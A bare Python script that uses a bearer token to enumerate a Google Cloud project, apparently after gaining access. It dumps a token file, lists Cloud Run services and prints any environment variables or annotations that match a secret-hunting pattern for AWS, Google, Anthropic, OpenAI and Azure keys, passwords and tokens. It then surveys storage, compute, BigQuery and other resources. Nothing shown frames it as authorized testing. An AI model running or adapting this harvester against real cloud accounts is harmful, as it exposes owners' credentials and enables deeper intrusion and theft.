import json,urllib.request,os,re
T=os.environ["T"]
print("===TOKENHEX===")
print(open("/tmp/tokhex").read())
def g(url,method="GET",body=None):
    data=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,data=data,method=method,headers={"Authorization":"Bearer "+T,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=60) as x: return json.load(x)
    except Exception as e:
        return {"_err":str(e)[:300]}
svcs=[];page=None
while True:
    u="https://run.googleapis.com/v2/projects/861433193200/locations/-/services?pageSize=100"+(f"&pageToken={page}" if page else "")
    d=g(u)
    if "services" not in d: print("RUNSVC_ERR",json.dumps(d)[:400]); break
    svcs+=d["services"]; page=d.get("nextPageToken")
    if not page: break
print("SERVICES_TOTAL",len(svcs))
json.dump(svcs,open("/tmp/services.json","w"))
PAT=re.compile(r"AKIA|ASIA|AIza|sk-ant-|sk-proj-|gsk_|private_key|client_email|client_secret|tenant_id|tenantId|azure|entra|microsoftonline|graph\.microsoft|aiplatform|vertex|GOOGLE_APPLICATION|refresh_token|password|secret|token|apikey|api_key",re.I)
n=0
for s in svcs:
    md=s.get("metadata",{}); tm=s.get("template",{})
    nm=md.get("name")
    for k,v in (tm.get("annotations") or {}).items():
        if PAT.search(k) or PAT.search(str(v)): print("ANNO|%s|%s|%s"%(nm,k,str(v)[:300])); n+=1
    for c in tm.get("containers",[]):
        for e in c.get("env",[]) or []:
            v=e.get("value")
            if v is None and e.get("valueSource"): v="SRC:"+json.dumps(e["valueSource"])[:200]
            if v is None: continue
            if PAT.search(e.get("name","")) or PAT.search(str(v)):
                print("ENV|%s|%s|%s"%(nm,e.get("name"),str(v)[:400])); n+=1
    for vol in tm.get("volumes",[]) or []:
        print("VOL|%s|%s"%(nm,json.dumps(vol)[:200])); n+=1
print("ENVHITS",n)
for name,u in [
 ("artifactreg_us-central1","https://artifactregistry.googleapis.com/v1/projects/probestack-prod/locations/us-central1/repositories"),
 ("artifactreg_europe-west1","https://artifactregistry.googleapis.com/v1/projects/probestack-prod/locations/europe-west1/repositories"),
 ("compute_agg","https://compute.googleapis.com/compute/v1/projects/probestack-prod/aggregated/instances?maxResults=20"),
 ("functions","https://cloudfunctions.googleapis.com/v1/projects/probestack-prod/locations/-/functions"),
 ("runjobs","https://run.googleapis.com/v2/projects/861433193200/locations/-/jobs?pageSize=20"),
 ("storage_json","https://storage.googleapis.com/storage/v1/b?project=probestack-prod"),
 ("bigquery","https://bigquery.googleapis.com/bigquery/v2/projects/probestack-prod/datasets"),
 ("firestore","https://firestore.googleapis.com/v1/projects/probestack-prod/databases"),
 ("cloudtasks","https://cloudtasks.googleapis.com/v2/projects/probestack-prod/locations/-/queues"),
]:
    d=g(u)
    print("==API %s =="%name, json.dumps(d)[:2000])
